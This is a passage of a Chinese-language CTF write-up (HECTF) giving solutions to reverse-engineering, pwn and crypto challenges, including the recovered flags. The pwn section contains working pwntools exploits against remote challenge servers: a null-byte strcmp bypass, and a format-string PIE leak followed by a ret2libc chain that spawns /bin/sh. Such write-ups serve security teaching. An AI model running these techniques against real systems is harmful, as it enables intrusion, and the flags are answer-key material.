class="number">0xa4abb2b9</span>,</span><br><span class="line">              <span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>, <span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">              <span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>, <span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span>]</span><br><span class="line">        <span class="comment"># 将 128bit 拆分成 4x32bit</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            temp = <span class="built_in">int</span>.from_bytes(key[<span class="number">4</span> * i:<span class="number">4</span> * i + <span class="number">4</span>], <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            key_temp[i] = temp ^ FK[i]</span><br><span class="line">        <span class="comment"># 循环生成轮密钥</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">            box_in = key_temp[<span class="number">1</span>] ^ key_temp[<span class="number">2</span>] ^ key_temp[<span class="number">3</span>] ^ CK[i]</span><br><span class="line">            box_out = self._s_box(box_in)</span><br><span class="line">            key_r[i] = key_temp[<span class="number">0</span>] ^ box_out ^ self._rot_left(box_out, <span class="number">13</span>) ^ self._rot_left(box_out, <span class="number">23</span>)</span><br><span class="line">            key_temp = key_temp[<span class="number">1</span>:] + [key_r[i]]</span><br><span class="line">        <span class="keyword">return</span> key_r</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_s_box</span>(<span class="params">n: <span class="built_in">int</span></span>):</span></span><br><span class="line">        BOX = [<span class="number">0xD6</span>, <span class="number">0x90</span>, <span class="number">0xE9</span>, <span class="number">0xFE</span>, <span class="number">0xCC</span>, <span class="number">0xE1</span>, <span class="number">0x3D</span>, <span class="number">0xB7</span>, <span class="number">0x16</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xC2</span>, <span class="number">0x28</span>, <span class="number">0xFB</span>, <span class="number">0x2C</span>, <span class="number">0x05</span>, <span class="number">0x2B</span>,</span><br><span class="line">               <span class="number">0x67</span>, <span class="number">0x9A</span>, <span class="number">0x76</span>, <span class="number">0x2A</span>, <span class="number">0xBE</span>, <span class="number">0x04</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, <span class="number">0x44</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x49</span>, <span class="number">0x86</span>, <span class="number">0x06</span>, <span class="number">0x99</span>, <span class="number">0x9C</span>, <span class="number">0x42</span>,</span><br><span class="line">               <span class="number">0x50</span>, <span class="number">0xF4</span>, <span class="number">0x91</span>, <span class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_rot_left</span>(<span class="params">n, m</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;循环左移&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;</span>)  <span class="comment"># 128bit密钥</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动调测试加密</span></span><br><span class="line"><span class="comment"># plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;)  # 128bit明文</span></span><br><span class="line"><span class="comment"># print(sm4.encrypt(plaintext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D75CDA22176DD392A1A570915F66A61C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(c).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6f2069d8ab245446d789590d2cfe20d6</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h3><blockquote><p>still ez</p></blockquote><p>识别代码逻辑为RC4算法，key为 <code>thiskey</code>，提取密文hex为 <code>C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946</code>，</p><p>Cyberchef解出flag：<code>HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125;</code></p><p>​    </p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>分析代码逻辑，为8层8*8迷宫，其中0为可走方块，1为不可走方块，wsad为上下左右，u为下一层，n为上一层。</p><p>将8层01迷宫矩阵打印出来，从第一层 (0,0) 手动模拟走迷宫，得到路径 <code>ssddssuuwwddndduuussdussasauudd</code>，加上HECTF{}即为flag。</p><p>​    </p><h3 id="还原md5"><a href="#还原md5" class="headerlink" title="还原md5"></a>还原md5</h3><blockquote><p>MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613  哈哈哈，逆去吧</p><p>HINTS:</p><p>注意，re题目md5的flag提交时不需要再套HECTF{}</p></blockquote><p>txt内容像是调用libsfdata.so计算md5过程汇编操作记录，既然是全过程，肯定有读入原始数据，以16进制存入寄存器或内存的痕迹，HECT的hex值”48454354“，注意是小端序，全局搜索 <code>54434548</code>，找到 <code>r6=0x54434548</code> 疑似读入寄存器操作，继续全局搜索 <code>=&gt; r6=0x</code>，有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548</span><br><span class="line">Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46</span><br><span class="line">Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32</span><br><span class="line">Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636</span><br><span class="line">Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237</span><br><span class="line">Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338</span><br><span class="line">Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059</span><br><span class="line">Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61</span><br><span class="line">Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431</span><br><span class="line">Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964</span><br><span class="line">Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6e</span><br><span class="line">Line 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576</span><br></pre></td></tr></table></figure><p>提取出r6的值hex转字符即为flag：<code>HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw</code></p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>先利用 <code>\x00</code> 截断绕过 <code>strcmp</code> 比较，进入 <code>system(&#39;vim -R&#39;)</code> 的vim交互模式，再使用vim命令 <code>:e 文件名</code> 读取flag内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.111.50&#x27;</span>,<span class="number">32365</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;:e flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>值得注意的是，由于进入vim命令会清空终端内容，在pwntools交互下读取的内容会被瞬间刷掉，可以将输出重定向到文件，获取到flag内容输出：</p><p><code>python test.py &gt; output.txt</code></p><p>​    </p><h3 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h3><blockquote><p>听说你还没签上到</p></blockquote><p>int类型强制转换为char，当值为128~255时变成负数，模拟伪代码，在最大值2147483647附近尝试寻找所需数字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">2147483646</span><span class="number">-124</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="keyword">int</span> y = x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">char</span>)y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="keyword">char</span>)y&lt;<span class="number">-125</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, y&gt;<span class="number">255</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2147483522满足条件，传入后getshell拿到flag。</p><p>​    </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>程序开了PIE，gdb动调，利用格式化字符串漏洞泄露当前函数地址，再减去偏移得到程序基址，剩下的部分简单ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.102.43&#x27;</span>,<span class="number">31550</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>))-<span class="number">0x123a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = pie_base+<span class="number">0x1333</span></span><br><span class="line">pop_rsi_r15 = pie_base+<span class="number">0x1331</span></span><br><span class="line">ret = pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_got = pie_base+elf.got.puts</span><br><span class="line">puts_plt = pie_base+elf.plt.puts</span><br><span class="line">get = pie_base+<span class="number">0x12ab</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(get)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h3><p>txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag。</p><p>​    </p><h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>出题失误，源码泄露拿到flag。</p><p>​    </p><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line"><span class="comment">#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="comment">#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line"><span class="comment">#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 </span></span><br></pre></td></tr></table></figure></blockquote><p>因 $p^2&lt;n,q^2&lt;n$，可直接开放求得 $p,q$ 及 $r$。</p><p>又 $\gcd(e,\varphi)=6$，利用 $\gcd(\cfrac{e}{6},\varphi)=1$ 先常规RSA计算出 $m^6$ 再开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_ = </span><br><span class="line">q_ = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(p_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = gmpy2.iroot(q_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = n//(p*q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">d = inverse_mod(e//<span class="number">6</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(mm,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 